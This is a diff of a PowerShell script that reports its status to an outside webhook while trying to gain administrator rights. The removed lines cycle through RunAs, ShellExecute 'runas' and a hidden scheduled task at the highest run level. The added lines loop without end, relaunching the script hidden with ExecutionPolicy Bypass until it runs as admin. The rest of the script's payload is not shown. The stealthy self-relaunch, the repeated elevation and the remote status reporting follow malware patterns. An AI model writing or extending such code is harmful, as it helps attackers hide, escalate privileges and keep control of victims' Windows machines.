@@ -17,62 +17,23 @@ function Send-WebhookMessage {
 Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
 try {
-    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    if (-not $isAdmin) {
-        $attempts = 0
-        $maxAttempts = 3
-        $elevationMethods = @(
-            @{
-                Method = 'RunAs'
-                Action = {
-                    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
-                }
-            },
-            @{
-                Method = 'ShellExecute'
-                Action = {
-                    $shell = New-Object -ComObject Shell.Application
-                    $shell.ShellExecute('powershell.exe', "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"", '', 'runas')
-                }
-            },
-            @{
-                Method = 'ScheduledTask'
-                Action = {
-                    $taskName = "TempAdminTask_$([guid]::NewGuid().ToString())"
-                    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-                    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
-                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-                    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -RunLevel Highest | Out-Null
-                    Start-ScheduledTask -TaskName $taskName
-                    Start-Sleep -Seconds 5
-                    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-                }
+    $PSCommandPath = $MyInvocation.MyCommand.Path
+    while ($true) {
+        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        if ($isAdmin) {
+            Send-WebhookMessage -Message 'Script is running with administrative privileges.'
+            break
+        } else {
+            Send-WebhookMessage -Message 'Requesting administrative privileges...'
+            try {
+                $shell = New-Object -ComObject Shell.Application
+                $shell.Run('powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "' + $PSCommandPath + '"', 0, $false)
+                Start-Sleep -Seconds 3
+            } catch {
+                Send-WebhookMessage -Message "Failed to request admin privileges: $_"
+                Start-Sleep -Seconds 3
             }
-        )
-        while (-not $isAdmin -and $attempts -lt $maxAttempts) {
-            foreach ($method in $elevationMethods) {
-                try {
-                    Send-WebhookMessage -Message "Attempting elevation using $($method.Method) (Attempt $($attempts + 1))..."
-                    & $method.Action
-                    Start-Sleep -Milliseconds 1000
-                    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-                    if ($isAdmin) {
-                        Send-WebhookMessage -Message 'Elevation successful. Script is now running with administrative privileges.'
-                        break
-                    }
-                } catch {
-                    Send-WebhookMessage -Message "Elevation failed with $($method.Method): $_"
-                    Start-Sleep -Milliseconds 500
-                }
-            }
-            $attempts++
         }
-        if (-not $isAdmin) {
-            Send-WebhookMessage -Message 'All elevation attempts failed after maximum retries.'
-            exit
-        }
-    } else {
-        Send-WebhookMessage -Message 'Script is running with administrative privileges.'
     }
 
     try {
